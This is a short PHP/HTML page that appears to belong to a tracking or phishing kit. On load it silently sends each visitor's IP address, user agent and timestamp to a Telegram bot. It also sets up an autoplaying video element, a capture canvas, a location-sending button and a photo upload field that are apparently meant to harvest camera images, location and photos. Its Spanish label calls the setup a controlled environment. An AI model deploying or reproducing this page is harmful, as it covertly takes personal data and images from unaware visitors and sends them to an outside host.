<?php
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "👋 <b>Nueva visita en entorno controlado</b>\n".
       "📌 IP: $ip\n".
       "🖥️ UA: $ua\n".
       "⏰ Hora: $ts";
send_to_telegram($msg);
?>

<!doctype html>
<html>
<head>
<link rel="stylesheet" href="assets/style.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>

<div class="video-wrap">
   <video id="video" playsinline autoplay></video>
</div>

<canvas id="canvas" width="640" height="480"></canvas>

<button id="btnLocate">Enviar ubicación</button>
<div id="locStatus"></div>
<pre id="locData"></pre>

<input type="file" id="photoInput" accept="image/*">
<div id="photoStatus"></div>

<script src="assets/script.js"></script>
</body>
</html>
